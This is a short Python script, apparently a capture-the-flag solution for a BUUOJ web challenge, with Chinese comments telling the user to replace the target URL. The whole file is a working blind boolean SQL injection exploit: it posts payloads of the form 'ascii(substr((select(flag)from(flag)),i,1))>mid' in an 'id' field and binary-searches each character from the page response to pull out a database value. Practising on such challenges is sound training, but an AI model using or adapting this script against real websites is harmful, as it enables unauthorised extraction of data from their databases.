import requests
import time

url = "http://f4b59740-c8e4-4653-a1fd-e2be614665d2.node4.buuoj.cn:81/index.php"      #这里url换掉
payload = {
    "id" : ""
}
result = ""
for i in range(1,50):
    l = 33
    r =130
    mid = (l+r)>>1
    while(l<r):
        payload["id"] = "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
        html = requests.post(url,data=payload)
        #print(payload)        #这里可以输出payload，想看payload的可以看
        if "Hello" in html.text:
            l = mid+1
        else:
            r = mid
        mid = (l+r)>>1
    if(chr(mid)==" "):
        break
    result = result + chr(mid)
    print(result)
print("flag: " ,result)
